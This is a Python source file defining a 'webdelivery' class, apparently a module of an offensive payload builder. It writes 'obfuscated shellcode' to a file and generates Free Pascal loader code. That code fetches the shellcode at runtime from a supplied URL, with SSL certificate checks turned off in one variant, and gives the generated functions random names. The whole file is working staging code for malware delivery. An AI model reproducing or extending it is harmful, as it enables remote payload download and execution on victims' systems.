import random
import string

class webdelivery:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.shellcodetype = type(shellcode).__name__
        if self.shellcodetype == 'bytes':
            open(outfile, 'wb').write(shellcode)
        elif self.shellcodetype == 'str':
            open(outfile, 'w').write(shellcode)
        elif self.shellcodetype == 'list':
            open(outfile, 'w').write('\n'.join(shellcode))
        print(f'Writing obfuscated shellcode to {outfile}')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)

    def imports(self) -> list[str]:
        return ['fphttpclient', 'ssockets', 'StrUtils']

    def compilerOptions(self) -> list[str]:
        return ['-gl', '-gh', '-Criot']

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}()')

    def codeblock(self) -> str:
        if self.shellcodetype == 'bytes':
            return f"""
function {self.name}: TBytes;
var
    client: TFPHttpClient;
    stream: TBytesStream;

begin
    stream := TBytesStream.create;
    client := TFPHttpClient.Create(nil);
    client.VerifySSLCertificate := False; 
    try
        client.get('{self.url}', stream);
        SetLength(Result, stream.Size);
        Move(stream.bytes[0], Result[0], stream.size);
    finally
        stream.Free;
        client.free;
    end;
end;
"""

        elif self.shellcodetype == 'str':
            return f"""
function {self.name}: String;

begin
    result := TFPHTTPClient.SimpleGet('{self.url}');
end;
"""

        elif self.shellcodetype == 'list':
            return f"""
function {self.name}: TStringArray;
var
    responseString: String;

begin
    responseString := TFPHTTPClient.SimpleGet('{self.url}');
    result := responseString.Split([#10]);
end;
"""